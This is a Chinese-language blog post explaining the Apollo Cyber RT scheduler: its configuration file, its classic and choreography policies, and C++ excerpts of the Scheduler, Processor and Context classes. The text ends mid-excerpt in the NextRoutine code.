    <content type="html"><![CDATA[<h1>Apollo Cyber RT 调度系统解析</h1><h2 id="前言">前言</h2><p><a href="https://dingfen.github.io/apollo/2020/10/14/apollo-intro.html">上篇博客中</a>，我简要地给大家介绍了 Apollo 系统，以及它的代码文件结构，并说明了一下 Cyber RT 在 Apollo 系统中的地位（是的，我调整了一下博客的内容，使之变得更加均衡合理）。Cyber RT 在系统的任务调度方面有重要的作用，又和实时系统要求密切相关。因此，我打算将调度系统作为一个切入点，在本篇博客中，我将会给大家介绍一下 Cyber RT 的调度系统。</p><h2 id="Cyber中的调度">Cyber中的调度</h2><p>自动驾驶系统的有三大流程：<strong>感知、决策、执行</strong>。例如，车上的传感器感知到障碍物，判断其类型、运动轨迹等，再做出决策，最后再到刹车、油门和方向的控制，这会经过一系列模块的计算。这些模块在计算过程中会产生数据依赖，如果用箭头将模块间的数据依赖表示出来，就会形成图的拓扑结构。</p><p>在 Apollo 项目中，通常使用 DAG file 来描述<strong>计算图</strong>的拓扑结构。由于自动驾驶系统牵扯到很多的步骤，有很复杂的流程，相应的，这些计算图也十分庞大。因此，如何调度整个计算图使系统能满足各种时间约束，达到系统的实时性和确定性，是个巨大的挑战。</p><p>接下来，我们就详细地剖析一下 Cyber RT 的调度系统💪！</p><h3 id="conf-配置文件">conf 配置文件</h3><p>Cyber 调度的配置文件在 <code>cyber/conf </code> 文件夹中，配置文件详细说明了线程名、线程的 CPU 亲和性、调度策略，对于协程，还有分组情况、协程的优先级等等。</p><p>方便起见，我从<a href="https://github.com/ApolloAuto/apollo/blob/master/docs/cyber/CyberRT_Scheduler_cn.md">官方文档</a>中举例，文档对每项设置的说明都非常具体：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-title class_">scheduler_conf</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-comment">// 1. 设置调度器策略</span><br><span class="hljs-symbol">    policy:</span> <span class="hljs-string">&quot;classic&quot;</span><br>    <span class="hljs-comment">// 2. 设置cpu set</span><br><span class="hljs-symbol">    process_level_cpuset:</span> <span class="hljs-string">&quot;0-7,16-23&quot;</span> <span class="hljs-meta"># all threads in the process are on the cpuset</span><br>    <span class="hljs-comment">// 3. 设置线程的cpuset，调度策略和优先级</span><br><span class="hljs-symbol">    threads:</span> [<br>        <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">            name:</span> <span class="hljs-string">&quot;async_log&quot;</span><br><span class="hljs-symbol">            cpuset:</span> <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-symbol">            policy:</span> <span class="hljs-string">&quot;SCHED_OTHER&quot;</span>   <span class="hljs-meta"># policy: SCHED_OTHER,SCHED_RR,SCHED_FIFO</span><br><span class="hljs-symbol">            prio:</span> <span class="hljs-number">0</span><br>        <span class="hljs-punctuation">&#125;</span>, <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">            name:</span> <span class="hljs-string">&quot;shm&quot;</span><br><span class="hljs-symbol">            cpuset:</span> <span class="hljs-string">&quot;2&quot;</span><br><span class="hljs-symbol">            policy:</span> <span class="hljs-string">&quot;SCHED_FIFO&quot;</span><br><span class="hljs-symbol">            prio:</span> <span class="hljs-number">10</span><br>        <span class="hljs-punctuation">&#125;</span><br>    ]<br>    <span class="hljs-title class_">classic_conf</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-comment">// 4. 设置分组，线程组的cpuset，cpu亲和性，调度策略和优先级</span><br>        <span class="hljs-comment">// 设置调度器创建&quot;processor&quot;对象的个数，以及协程的优先级。  </span><br><span class="hljs-symbol">        groups:</span> [<br>            <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">                name:</span> <span class="hljs-string">&quot;group1&quot;</span><br><span class="hljs-symbol">                processor_num:</span> <span class="hljs-number">16</span><br><span class="hljs-symbol">                affinity:</span> <span class="hljs-string">&quot;range&quot;</span><br><span class="hljs-symbol">                cpuset:</span> <span class="hljs-string">&quot;0-7,16-23&quot;</span><br><span class="hljs-symbol">                processor_policy:</span> <span class="hljs-string">&quot;SCHED_OTHER&quot;</span><br>         <span class="hljs-comment">// policy: </span><br>         <span class="hljs-comment">// SCHED_OTHER  默认策略 分时调度策略</span><br>         <span class="hljs-comment">// SCHED_RR 实时调度策略 时间片轮转</span><br>         <span class="hljs-comment">// SCHED_FIFO   队列 先到先服务策略</span><br><span class="hljs-symbol">                processor_prio:</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">                tasks:</span> [<br>                    <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">                        name:</span> <span class="hljs-string">&quot;E&quot;</span><br><span class="hljs-symbol">                        prio:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                ]<br>            <span class="hljs-punctuation">&#125;</span>,<span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">                name:</span> <span class="hljs-string">&quot;group2&quot;</span><br><span class="hljs-symbol">                processor_num:</span> <span class="hljs-number">16</span><br><span class="hljs-symbol">                affinity:</span> <span class="hljs-string">&quot;1to1&quot;</span><br><span class="hljs-symbol">                cpuset:</span> <span class="hljs-string">&quot;8-15,24-31&quot;</span><br><span class="hljs-symbol">                processor_policy:</span> <span class="hljs-string">&quot;SCHED_OTHER&quot;</span><br><span class="hljs-symbol">                processor_prio:</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">                tasks:</span> [<br>                    <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">                        name:</span> <span class="hljs-string">&quot;A&quot;</span><br><span class="hljs-symbol">                        prio:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span>,<span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">                        name:</span> <span class="hljs-string">&quot;B&quot;</span><br><span class="hljs-symbol">                        prio:</span> <span class="hljs-number">1</span><br>                    <span class="hljs-punctuation">&#125;</span>,<span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">                        name:</span> <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-symbol">                        prio:</span> <span class="hljs-number">2</span><br>                    <span class="hljs-punctuation">&#125;</span>,<span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">                        name:</span> <span class="hljs-string">&quot;D&quot;</span><br><span class="hljs-symbol">                        prio:</span> <span class="hljs-number">3</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                ]<br>            <span class="hljs-punctuation">&#125;</span><br>        ]<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>那么上面的 <code>conf</code> 文档描述了怎么样的调度策略呢？</p><p>还是参考<a href="https://github.com/ApolloAuto/apollo/blob/master/docs/cyber/CyberRT_Scheduler_cn.md">官方文档</a>，对于配置文件中已经编排好的任务，其拓扑结构就依据优先级确定了。我们根据上面的 <code>conf</code> 文档，可以简单画出任务的<strong>优先级拓扑</strong>情况，如下图，A、B、C、D 任务在第一个 group 中执行，E在第二个 group 中执行，对于没有出现在配置中的任务，比如F默认会放到第一个 group 中执行（下文会提到哦）。 而且配置中我们对于任务进行了优先级设置，A、B、C、D 的任务优先级依次增大，正好对应下图的拓扑依赖关系，在链路中越靠后的任务优先级越高。其实，数据也是这样在任务拓扑图中传递，数据走到最后，执行的任务优先级越高，这是为保证整个流程可以快速走完，不被其他流程的任务打断。</p><center><img src="/img/topo_sched.png" style="zoom:50%;" /></center><span id="1" ><h3 id="调度策略">调度策略</h3><p>Apollo 提供了两种调度策略，一种是 classic 策略，在代码中，用 <code>SchedulerClassic</code> 类实现；另一种是 Choreography 策略，代码中用 <code>SchedulerChoreography</code> 类实现。对于这两个策略，我们先给一个大致的描述，好让大家理解之间的差异，稍后在代码分析中，会详细解释这些实现 :smile: 。</p><ul><li><p>classic 策略</p><ul><li>较为通用的调度策略</li><li>如果对当前自动驾驶车辆上的 DAG 结构不清楚，建议使用此策略</li><li>相关协程任务以组为单位与线程作绑定</li><li><code>SchedulerClassic</code> 采用了<a href="https://studygolang.com/articles/15477">协程池</a>的概念，协程不会绑定到具体的 <code>Processor</code>，而是放在全局的优先级队列中。<code>Processor</code> 运行时，每次从最高优先级的任务开始调度执行。</li></ul></li><li><p>choreography 策略</p><ul><li>需要对车上的任务、结构足够熟悉</li><li>根据任务的执行依赖关系、任务的执行时长、任务 CPU 消耗情况、消息频率等，对某些任务进行编排</li><li><code>SchedulerChoreography</code> 类采用了本地队列和全局队列相结合的方式。他将<strong>主链路</strong>（choreography开头的配置）进行编排；而对非主链路的任务放到线程池中使用 classic 策略执行。</li></ul></li></ul><p>当使用 choreography 策略时，具体该怎么办？Well，根据任务优先级、执行时长、频率与调度之间的关系，任务编排有如下几个依据（经验）：</p><ul><li>在同一个路径上的任务尽量编排在同一个 <code>Processor</code> 中，如果 <code>Processor</code> 负载过高，可考虑将部分任务拆分到其他 <code>Processor</code></li><li>为防止优先级倒挂，同一个路径上的任务从开始到结束，优先级应逐级升高</li><li>不同路径上的任务尽量<strong>不</strong>混排</li><li>高频且短耗时任务尽量编排在同一个 <code>Processor</code> 上</li></ul><p>另：据 <a href="https://github.com/daohu527/Dig-into-Apollo/tree/master/cyber/source">Dig-into-Apollo</a>中的说法，该调度策略与 Go 语言中的 <a href="https://learnku.com/articles/41728">GPM 模型</a>相似。</p><h3 id="Scheduler、Processor-Context">Scheduler、Processor &amp; Context</h3><p>我从参考文献<sup>1</sup>中找到一张不错的类关系图，可以很好地帮我说明一下这些类的关系：</p><center><img src="/img/class.png" /></center><h4 id="Scheduler">Scheduler</h4><p><code>Scheduler</code> 类使用<a href="https://www.runoob.com/design-pattern/singleton-pattern.html">单例模式</a>，<code>Instance()</code> 方法被第一次调用时会加载 <code>conf</code> 文件，此时会根据配置文件中指定的类型创建 <code>SchedulerClassic</code> 或者 <code>SchedulerChoreography</code> 对象。</p><p>这就涉及到 <code>Scheduler</code> 类的构造函数，在这里，我不想展示具体代码的任何细节，因为这只会把原本就复杂的事物越搞越乱（如果你真的想仔细了解，还是亲自下场看一下代码吧），我经过总结，认为其步骤：</p><ol><li>读取 conf 配置文件，如果读取配置文件失败，会设置默认值</li><li>将内部线程信息保存到查询表中，并设置线程的亲和性和优先级等属性</li><li>将所有的任务按照配置文件的要求分为 group ，设置进程级别的cpuset</li><li>根据配置文件要求创建线程，并包装为 <code>Processor</code>（执行器），绑定上下文。</li></ol><p>这边我要多提一句，对于 choreography 策略，在创建线程时会比较特殊，它依照配置文件的要求，把所有线程分为两个部分（就如你在本篇博客最末尾看到的那样），其中一部分线程与 <code>ClassicContext</code> 绑定，另一部分与 <code>Choreography</code> 绑定，这意味着 choreography 策略负责编排一部分任务：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SchedulerChoreography::CreateProcessor</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; proc_num_; i++) &#123;<br>    <span class="hljs-keyword">auto</span> proc = std::<span class="hljs-built_in">make_shared</span>&lt;Processor&gt;();<br>    <span class="hljs-keyword">auto</span> ctx = std::<span class="hljs-built_in">make_shared</span>&lt;ChoreographyContext&gt;();<br>    proc-&gt;<span class="hljs-built_in">BindContext</span>(ctx);<br>    <span class="hljs-built_in">SetSchedAffinity</span>(proc-&gt;<span class="hljs-built_in">Thread</span>(), choreography_cpuset_,<br>                     choreography_affinity_, i);<br>    <span class="hljs-built_in">SetSchedPolicy</span>(proc-&gt;<span class="hljs-built_in">Thread</span>(), choreography_processor_policy_,<br>                   choreography_processor_prio_, proc-&gt;<span class="hljs-built_in">Tid</span>());<br>    pctxs_.<span class="hljs-built_in">emplace_back</span>(ctx);<br>    processors_.<span class="hljs-built_in">emplace_back</span>(proc);<br>  &#125;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; task_pool_size_; i++) &#123;<br>    <span class="hljs-keyword">auto</span> proc = std::<span class="hljs-built_in">make_shared</span>&lt;Processor&gt;();<br>    <span class="hljs-keyword">auto</span> ctx = std::<span class="hljs-built_in">make_shared</span>&lt;ClassicContext&gt;();<br>    proc-&gt;<span class="hljs-built_in">BindContext</span>(ctx);<br>    <span class="hljs-built_in">SetSchedAffinity</span>(proc-&gt;<span class="hljs-built_in">Thread</span>(), pool_cpuset_, pool_affinity_, i);<br>    <span class="hljs-built_in">SetSchedPolicy</span>(proc-&gt;<span class="hljs-built_in">Thread</span>(), pool_processor_policy_, pool_processor_prio_,<br>                   proc-&gt;<span class="hljs-built_in">Tid</span>());<br>    pctxs_.<span class="hljs-built_in">emplace_back</span>(ctx);<br>    processors_.<span class="hljs-built_in">emplace_back</span>(proc);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>除了构造函数之外，<code>Scheduler</code> 还负责分发、移除任务，也可以唤醒（Notify）某个任务。</p><p><strong>Update at 11.00 29th Oct in 2020.</strong></p><hr><p>一开始写这篇博客时，并没有把<code>Scheduler</code> 类的创建、分发、唤醒、移除任务讲清楚，那么今天我来把这个坑补上。</p><p>首先是创建任务，在 <a href="https://dingfen.github.io/apollo/2020/10/25/CyberComponent.html">Cyber RT 组件</a>中，我说过 <code>Component::Initialize()</code> 中创建的处理消息函数，会被首先用于创建协程工厂，然后 <code>Scheduler</code> 会使用 <code>CreateTask()</code> 函数创建协程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Scheduler::CreateTask</span><span class="hljs-params">(std::function&lt;<span class="hljs-type">void</span>()&gt;&amp;&amp; func,</span></span><br><span class="hljs-params"><span class="hljs-function">                           <span class="hljs-type">const</span> std::string&amp; name,</span></span><br><span class="hljs-params"><span class="hljs-function">                           std::shared_ptr&lt;DataVisitorBase&gt; visitor)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">cyber_unlikely</span>(stop_.<span class="hljs-built_in">load</span>())) &#123;<br><span class="hljs-comment">/*  错误处理  */</span><br>  &#125;<br>  <span class="hljs-comment">// 登记任务名字，获得id  </span><br>  <span class="hljs-comment">// GlobalData 中有一个 id 与 name 一一对应的表格</span><br>  <span class="hljs-comment">// 比起直译map这个单词 我更喜欢用表 因为这更容易让人理解</span><br>  <span class="hljs-keyword">auto</span> task_id = GlobalData::<span class="hljs-built_in">RegisterTaskName</span>(name);<br>  <span class="hljs-comment">// 创建协程</span><br>  <span class="hljs-keyword">auto</span> cr = std::<span class="hljs-built_in">make_shared</span>&lt;CRoutine&gt;(func);<br>  cr-&gt;<span class="hljs-built_in">set_id</span>(task_id);<br>  cr-&gt;<span class="hljs-built_in">set_name</span>(name);<br>  <span class="hljs-comment">// 分配任务</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DispatchTask</span>(cr))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-comment">// 数据访问者 登记回调函数</span><br>  <span class="hljs-keyword">if</span> (visitor != <span class="hljs-literal">nullptr</span>) &#123;<br>    visitor-&gt;<span class="hljs-built_in">RegisterNotifyCallback</span>([<span class="hljs-keyword">this</span>, task_id]() &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">cyber_unlikely</span>(stop_.<span class="hljs-built_in">load</span>()))<br>        <span class="hljs-keyword">return</span>;<br>      <span class="hljs-comment">// 唤醒 Processor  让它开始处理任务</span><br>      <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">NotifyProcessor</span>(task_id);<br>    &#125;);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面的代码中，可以看到协程创建完毕后，还会被分配任务，那么分配任务具体做什么呢？在 <code>SchedulerClassic</code> 类中，<code>DispatchTask()</code> 首先把协程 id 和其指针一一对应起来，放入到 <code>id_cr_</code> 表中（下图），然后根据配置文件设置这个协程的优先级和协程组，<strong>如果配置文件中没有提到该协程，默认放入组 0 中</strong>，最后将该协程根据其优先级，放入到<strong>队列</strong>（下图就有）中，最后唤醒所在组的上下文；对于 <code>SchedulerChoreography</code> 类，还需要多一步来判断协程对应的 <code>Processor</code> 类。那么相似的道理，移除任务就是先将协程停止，从表中、队列中移除。</p><center><img src="/img/classic.png" /></center><p>最后 <code>Scheduler::NotifyProcessor()</code> 会唤醒 <code>Processor</code> ，它首先检查传入 id 对应的协程的状态，然后就调用了上下文的 <code>Notify()</code> 函数，让控制线程的<a href="http://www.cplusplus.com/reference/condition_variable/condition_variable/">条件变量</a>唤醒一个线程（<code>Processor</code> 类）。那么等待一个线程呢？也是控制这个条件变量就行了😂，使用 <code>Wait_for</code> 函数就可以满足要求。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ClassicContext::Notify</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; group_name)</span> </span>&#123;<br>  (&amp;mtx_wq_[group_name])-&gt;<span class="hljs-built_in">Mutex</span>().<span class="hljs-built_in">lock</span>();<br>  notify_grp_[group_name]++;<br>  (&amp;mtx_wq_[group_name])-&gt;<span class="hljs-built_in">Mutex</span>().<span class="hljs-built_in">unlock</span>();<br>  cv_wq_[group_name].<span class="hljs-built_in">Cv</span>().<span class="hljs-built_in">notify_one</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ClassicContext::Wait</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lk</span><span class="hljs-params">(mtx_wrapper_-&gt;Mutex())</span></span>;<br>  cw_-&gt;<span class="hljs-built_in">Cv</span>().<span class="hljs-built_in">wait_for</span>(lk, std::chrono::<span class="hljs-built_in">milliseconds</span>(<span class="hljs-number">1000</span>),<br>                     [&amp;]() &#123; <span class="hljs-keyword">return</span> notify_grp_[current_grp] &gt; <span class="hljs-number">0</span>; &#125;);<br>  <span class="hljs-keyword">if</span> (notify_grp_[current_grp] &gt; <span class="hljs-number">0</span>) <br>    notify_grp_[current_grp]--;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="Processor">Processor</h4><p>前面说到，调度器中会创建线程，并包装为 <code>Processor</code>。<code>Scheduler</code> 根据 <code>conf</code> 文件初始化线程，并创建若干个 <code>Processor</code>。注意，我再此强调 <code>Processor</code> 并不是物理上的处理器，本质就是一个线程而已。为了加强印象，也为了后续方便理解，我在这里给出 <code>Processor</code> 的定义代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Processor</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-keyword">private</span>:<br>      std::shared_ptr&lt;ProcessorContext&gt; context_;<span class="hljs-comment">// 上下文</span><br>      std::condition_variable cv_ctx_;<span class="hljs-comment">// 条件变量</span><br>      std::once_flag thread_flag_;<span class="hljs-comment">// 线程 flag</span><br>      std::mutex mtx_ctx_;<span class="hljs-comment">// 互斥锁</span><br>      std::thread thread_;<span class="hljs-comment">// 线程</span><br>      std::atomic&lt;<span class="hljs-type">pid_t</span>&gt; tid_&#123;<span class="hljs-number">-1</span>&#125;;<span class="hljs-comment">// 线程id</span><br>      std::atomic&lt;<span class="hljs-type">bool</span>&gt; running_&#123;<span class="hljs-literal">false</span>&#125;;<span class="hljs-comment">// 是否运行</span><br></code></pre></td></tr></table></figure><p>好了，<code>Processor</code> 最重要的部分还是它如何运行。重要到什么程度？额嗯，我甚至可以花大篇幅把这部分代码完整地列出来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Processor::Run</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-comment">// 1. 获取线程的PID，系统内唯一</span><br>  tid_.<span class="hljs-built_in">store</span>(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-built_in">syscall</span>(SYS_gettid)));<br>  snap_shot_-&gt;processor_id.<span class="hljs-built_in">store</span>(tid_);<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-built_in">cyber_likely</span>(running_.<span class="hljs-built_in">load</span>())) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">cyber_likely</span>(context_ != <span class="hljs-literal">nullptr</span>)) &#123;<br>      <span class="hljs-comment">// 2. 获取优先级最高并且准备就绪的协程</span><br>      <span class="hljs-keyword">auto</span> croutine = context_-&gt;<span class="hljs-built_in">NextRoutine</span>();<br>      <span class="hljs-keyword">if</span> (croutine) &#123;<br>        snap_shot_-&gt;execute_start_time.<span class="hljs-built_in">store</span>(cyber::Time::<span class="hljs-built_in">Now</span>().<span class="hljs-built_in">ToNanosecond</span>());<br>        snap_shot_-&gt;routine_name = croutine-&gt;<span class="hljs-built_in">name</span>();<br>        <span class="hljs-comment">// 3. 执行协程任务，完成后释放协程</span><br>        croutine-&gt;<span class="hljs-built_in">Resume</span>();<br>        croutine-&gt;<span class="hljs-built_in">Release</span>();<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        snap_shot_-&gt;execute_start_time.<span class="hljs-built_in">store</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 4. 如果协程组中没有空闲的协程，则等待</span><br>        context_-&gt;<span class="hljs-built_in">Wait</span>();<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 5. 如果上下文为空，则线程阻塞10毫秒</span><br>      std::unique_lock&lt;std::mutex&gt; <span class="hljs-built_in">lk</span>(mtx_ctx_);<br>      cv_ctx_.<span class="hljs-built_in">wait_for</span>(lk, std::chrono::<span class="hljs-built_in">milliseconds</span>(<span class="hljs-number">10</span>));<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实 <code>Processor::Run()</code> 的逻辑很简单，就是不断地调用 <code>ProcessorContext::NextRoutine()</code> 函数，取得下一个协程（任务）。如果没取到，就调用 <code>ProcessorContext::Wait()</code> 等待。如果取到了，就调用 <code>CRoutine::Resume()</code> ，让任务继续运行。</p><p>看起来关键是 <code>NextRoutine()</code> 是如何挑选下一个任务的。参考上图，<code>ProcessorContext</code> 有两个派生类 <code>ClassicContext</code> 和 <code>ChoreographyContext</code> 。它们的实现因调度策略不同而不同。前者是按优先级从高到低从所在 group 对应的任务队列中取任务，取到后，需要判断其状态是否为 READY；后者也是按优先级从高到低的顺序，会将主链路上的任务与非主链路的任务分开列队，并且会为主链路上的任务提供指定的 <code>Processor</code> 。具体的内容很快我们就会在下一小节看到😀。</p><h4 id="Context">Context</h4><p><code>ProcessorContext</code> 类是一个抽象基类，它的实现非常简单，你甚至不用怀疑你的第一直觉，没错，<code>NextRoutine()</code> 和 <code>Wait()</code> 函数就是它最重要的部分。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessorContext</span> &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Shutdown</span><span class="hljs-params">()</span></span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> std::shared_ptr&lt;CRoutine&gt; <span class="hljs-title">NextRoutine</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Wait</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br><br> <span class="hljs-keyword">protected</span>:<br>  std::atomic&lt;<span class="hljs-type">bool</span>&gt; stop_&#123;<span class="hljs-literal">false</span>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们重点关注 <code>ClassicContext</code> 和 <code>ChoreographyContext</code> 。首先，看一下最关键的 <code>ProcessorContext::NextRoutine()</code> 的代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//  classic 调度策略的 NextRoutine()</span><br><span class="hljs-function">std::shared_ptr&lt;CRoutine&gt; <span class="hljs-title">ClassicContext::NextRoutine</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">cyber_unlikely</span>(stop_.<span class="hljs-built_in">load</span>()))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>   <span class="hljs-comment">// 1. 